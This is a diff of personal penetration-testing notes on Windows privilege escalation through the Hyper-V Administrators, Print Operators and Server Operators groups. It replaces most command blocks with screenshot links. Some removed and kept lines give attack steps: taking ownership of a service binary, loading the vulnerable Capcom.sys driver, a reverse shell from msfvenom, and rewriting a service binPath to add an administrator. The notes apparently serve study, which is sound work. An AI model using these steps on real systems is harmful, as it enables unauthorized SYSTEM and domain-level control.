@@ -1,3 +1,5 @@
+## Hyper-V Administrators
+
 Hyper-V Admins could easily create a clone of the DC and mount the VDI/VHDX.
 
 Upon deleteing a VM, `vmms.exe` attempts to restore the original file permissions of the
@@ -15,24 +17,33 @@ An example of this is Firefox, which installs the `Mozilla Maintenance Service`.
 this PoC to grant our current user full permissions on the file below:
 https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1
 
-```
-C:\Program Files (x86)\Mozilla Maintenancce Service\maintenanceservice.exe
-takeown /F C:\Program Files (x86)\Mozilla Maintenancce Service\maintenanceservice.exe
-sc.exe start MozillaMaintenance
-```
+![[Pasted image 20230107150113.png]]
 
-# Print Operators
+#### Take Ownership of the File
+
+![[Pasted image 20230107150133.png]]
+
+#### Start Mozilla Maintenance Service
+
+![[Pasted image 20230107150156.png]]
+
+## Print Operators
 
 `SeLoadDriverPrivilege`
 
 This repo https://github.com/hfiref0x/UACME features a comprehensive list of UAC bypasses
 which can be used form the command line.
 
-```
-whoami /priv
-```
+#### Confirming Privileges
 
-If we examine the privileges again, SeLoadDriverPrivilege is visible but disabled.
+![[Pasted image 20230107150402.png]]
+
+#### Checking Privileges Again
+
+The `UACMe` repo features a comprehensive list of UAC bypasses from command line.
+Examining the permissions again, we see `SeLoadDriverPrivilege` is visible but disabled.
+
+![[Pasted image 20230107151523.png]]
 
 It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute
 shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver
@@ -55,40 +66,28 @@ Next, from Visual Studio 2019 Developer Command Prompt, compile it using `cl.exe
 Then download the Capcom.sys driver and save it to `C:\temp`. Issue the command to add
 reference to this driver under our HKEY_CURRENT_USER tree.
 
-```
-cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+![[Pasted image 20230107151844.png]]
+![[Pasted image 20230107151858.png]]
 
-reg add HKCU\System\CurrentControlSet\CAPCOM 
-	/v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
-```
+#### Verify the Driver is not Loaded
 
-Verify the driver is not loaded:
-```
-.\DriverView.exe /stext drivers.txt
-cat drivers.txt | Select-String -pattern Capcom
-```
+![[Pasted image 20230107151939.png]]
 
-Verify Privilege is enabled:
-```
-EnableSeLoadDriverPrivilege.exe
-```
+#### Verify Privilege is enabled
 
-Verify Capcom Driver is listed:
-```
-.\DriverView.exe /stext drivers.txt
-cat drivers.txt | Select-String -pattern Capcom
-```
+![[Pasted image 20230107152054.png]]
 
-Use ExploitCapcom Tool to Escalate Privileges:
-```
-.\ExploitCapcom.exe
-```
+#### Verify Capcom Driver is listed
+
+![[Pasted image 20230107152122.png]]
+
+#### Use ExploitCapcom Tool to Escalate Privileges
+
+![[Pasted image 20230107152149.png]]
 
 ## Alternate Exploitation - No GUI
 
 If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.
-
-Code: c
 
 ```c
 // Launches a command shell process
@@ -144,35 +143,33 @@ assignment of Domain Admin privileges. It's a very highly privileged group.
 Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege`.
 
 #### Querying the AppReadiness Service
-```
-sc qc AppReadiness
-```
+
+![[Pasted image 20230107152440.png]]
 
 #### Checking Service Permissions with PsService
-```
-PsService.exe security AppReadiness
-```
+
+PsService is part of the `Sysinternals suite` to check permissions on the service.
+
+PsService works much like the sc utility and can display service status and configurations, also
+allowing you to start, stop, pause, resume and restart services both locally and remotely.
+
+![[Pasted image 20230107152640.png]]
 
 #### Checking Local Admin Group Membership
-```
-net local group Administrators
-```
+
+![[Pasted image 20230107152657.png]]
 
 #### Modifying the Service Binary Path
-```
-sc config AppReadiness binPath="
-	cmd /c net localgroup Administrators server_adm /add"
-```
+
+![[Pasted image 20230107152716.png]]
 
 #### Starting the Service
-```
-sc start AppReadiness
-```
+
+![[Pasted image 20230107152731.png]]
 
 #### Confirming Local Admin Group Membership
-```
-net local group Administrators
-```
+
+![[Pasted image 20230107152752.png]]
 
 #### Confirming Local Admin Access on the DC
 ```bash
